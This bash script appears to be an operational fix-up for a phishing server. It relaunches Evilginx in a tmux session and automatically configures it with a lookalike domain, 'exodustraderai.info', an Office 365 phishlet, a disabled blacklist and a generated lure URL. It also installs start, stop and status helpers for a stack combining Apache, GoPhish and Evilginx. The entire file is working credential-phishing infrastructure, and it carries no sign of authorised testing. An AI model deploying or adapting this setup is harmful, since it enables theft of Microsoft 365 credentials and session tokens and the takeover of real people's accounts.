#!/bin/bash

#############################################
# Quick Fix for Evilginx on Running VM
# Run this on the VM to fix Evilginx issues
#############################################

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║       Evilginx Quick Fix - Tmux Migration                    ║${NC}"
echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════╝${NC}"
echo ""

DOMAIN="${DOMAIN:-exodustraderai.info}"

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo -e "${YELLOW}Please run as root: sudo bash $0${NC}"
    exit 1
fi

echo -e "${GREEN}[1/6]${NC} Stopping and disabling Evilginx systemd service..."
systemctl stop evilginx 2>/dev/null || true
systemctl disable evilginx 2>/dev/null || true

echo -e "${GREEN}[2/6]${NC} Starting Evilginx in tmux session..."
tmux kill-session -t evilginx 2>/dev/null || true
tmux new-session -d -s evilginx "cd /opt/evilginx && ./evilginx -p /opt/evilginx/phishlets -g /root/.evilginx"

echo -e "${GREEN}[3/6]${NC} Waiting for Evilginx to initialize..."
sleep 5

echo -e "${GREEN}[4/6]${NC} Configuring Evilginx automatically..."
tmux send-keys -t evilginx "config domain ${DOMAIN}" C-m
sleep 1
tmux send-keys -t evilginx "config ipv4 external" C-m
sleep 1
tmux send-keys -t evilginx "blacklist noadd" C-m
sleep 1
tmux send-keys -t evilginx "phishlets hostname O365 ${DOMAIN}" C-m
sleep 1
tmux send-keys -t evilginx "phishlets enable O365" C-m
sleep 1
tmux send-keys -t evilginx "lures create O365" C-m
sleep 1
tmux send-keys -t evilginx "lures get-url 0" C-m
sleep 2

echo -e "${GREEN}[5/6]${NC} Updating management scripts..."

# Update bitb-start
cat > /usr/local/bin/bitb-start <<'EOSTART'
#!/bin/bash
echo "Starting all services..."
systemctl start apache2
systemctl start gophish

# Start Evilginx in tmux if not running
if ! tmux has-session -t evilginx 2>/dev/null; then
    echo "Starting Evilginx in tmux..."
    tmux new-session -d -s evilginx "cd /opt/evilginx && ./evilginx -p /opt/evilginx/phishlets -g /root/.evilginx"
else
    echo "Evilginx tmux session already running"
fi

echo "All services started"
systemctl status apache2 gophish --no-pager
echo ""
echo "Evilginx status: $(tmux has-session -t evilginx 2>/dev/null && echo 'Running in tmux' || echo 'Not running')"
EOSTART

# Update bitb-stop
cat > /usr/local/bin/bitb-stop <<'EOSTOP'
#!/bin/bash
echo "Stopping all services..."
systemctl stop apache2
systemctl stop gophish

# Kill Evilginx tmux session
if tmux has-session -t evilginx 2>/dev/null; then
    echo "Stopping Evilginx tmux session..."
    tmux kill-session -t evilginx
fi

echo "All services stopped"
EOSTOP

# Update bitb-status
cat > /usr/local/bin/bitb-status <<'EOSTATUS'
#!/bin/bash
echo "Service Status:"
echo ""
echo "=== Apache2 ==="
systemctl status apache2 --no-pager | head -n 3
echo ""
echo "=== GoPhish ==="
systemctl status gophish --no-pager | head -n 3
echo ""
echo "=== Evilginx ==="
if tmux has-session -t evilginx 2>/dev/null; then
    echo "Status: Running in tmux session 'evilginx'"
    echo "To access: tmux attach -t evilginx"
    echo "To detach: Press Ctrl+B then D"
else
    echo "Status: Not running"
    echo "To start: bitb-start"
fi
EOSTATUS

chmod +x /usr/local/bin/bitb-start
chmod +x /usr/local/bin/bitb-stop
chmod +x /usr/local/bin/bitb-status

echo -e "${GREEN}[6/6]${NC} Verifying services..."
sleep 2

echo ""
echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}  Service Status${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
echo ""

bitb-status

echo ""
echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║                    FIX COMPLETE!                              ║${NC}"
echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}Evilginx is now running in tmux session.${NC}"
echo ""
echo -e "${YELLOW}To access Evilginx console:${NC}"
echo "  tmux attach -t evilginx"
echo ""
echo -e "${YELLOW}To detach from console:${NC}"
echo "  Press Ctrl+B then D"
echo ""
echo -e "${YELLOW}Management commands:${NC}"
echo "  bitb-start   - Start all services"
echo "  bitb-stop    - Stop all services"
echo "  bitb-status  - Check status"
echo ""
